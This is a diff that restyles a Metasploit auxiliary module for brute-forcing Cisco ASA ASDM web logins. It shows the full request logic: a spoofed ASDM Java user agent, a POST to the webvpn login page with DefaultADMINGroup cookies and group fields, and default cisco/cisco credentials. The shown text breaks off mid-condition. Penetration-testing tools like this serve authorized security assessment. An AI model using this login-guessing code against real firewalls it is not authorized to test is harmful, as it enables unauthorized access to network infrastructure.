@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,36 +8,35 @@ require 'rex/proto/http'
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Cisco ASA ASDM Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for Cisco ASA ASDM web login portals and
-        performs login brute force to identify valid credentials.
-      },
-      'Author'         =>
-        [
-          'Jonathan Claudius <jclaudius[at]trustwave.com>',
-        ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' => { 'SSL' => true }
-    ))
+                      'Name'           => 'Cisco ASA ASDM Bruteforce Login Utility',
+                      'Description'    => %(
+                        This module scans for Cisco ASA ASDM web login portals and
+                        performs login brute force to identify valid credentials.
+                      ),
+                      'Author'         =>
+                        [
+                          'Jonathan Claudius <jclaudius[at]trustwave.com>'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' => { 'SSL' => true }))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", 'cisco']),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'cisco'])
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless check_conn?
       print_error("Connection failed, Aborting...")
       return
@@ -59,10 +59,9 @@ class MetasploitModule < Msf::Auxiliary
   def check_conn?
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/',
-        'method'    => 'GET'
-      })
+        'uri' => '/',
+        'method' => 'GET'
+      )
       print_good("Server is responsive...")
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       return
@@ -71,21 +70,20 @@ class MetasploitModule < Msf::Auxiliary
 
   # Verify whether we're working with ASDM or not
   def is_app_asdm?
-      res = send_request_cgi(
-      {
-        'uri'       => '/+webvpn+/index.html',
-        'method'    => 'GET',
-        'agent'     => 'ASDM/ Java/1.6.0_65'
-      })
+    res = send_request_cgi(
+      'uri' => '/+webvpn+/index.html',
+      'method'    => 'GET',
+      'agent'     => 'ASDM/ Java/1.6.0_65'
+    )
 
-      if res &&
-         res.code == 200 &&
-         res.get_cookies.include?('webvpn')
+    if res &&
+       res.code == 200 &&
+       res.get_cookies.include?('webvpn')
 
-        return true
-      else
-        return false
-      end
+      return true
+    else
+      return false
+    end
   end
 
   def report_cred(opts)
@@ -119,18 +117,16 @@ class MetasploitModule < Msf::Auxiliary
   def do_login(user, pass)
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
-      res = send_request_cgi({
-        'uri'       => '/+webvpn+/index.html',
-        'method'    => 'POST',
-        'agent'     => 'ASDM/ Java/1.6.0_65',
-        'ctype'     => 'application/x-www-form-urlencoded; charset=UTF-8',
-        'cookie'    => 'webvpnlogin=1; tg=0DefaultADMINGroup',
-        'vars_post' => {
-          'username' => user,
-          'password' => pass,
-          'tgroup'   => 'DefaultADMINGroup'
-        }
-      })
+      res = send_request_cgi('uri' => '/+webvpn+/index.html',
+                             'method'    => 'POST',
+                             'agent'     => 'ASDM/ Java/1.6.0_65',
+                             'ctype'     => 'application/x-www-form-urlencoded; charset=UTF-8',
+                             'cookie'    => 'webvpnlogin=1; tg=0DefaultADMINGroup',
+                             'vars_post' => {
+                               'username' => user,
+                               'password' => pass,
+                               'tgroup'   => 'DefaultADMINGroup'
+                             })
 
       if res &&
          res.code == 200 &&
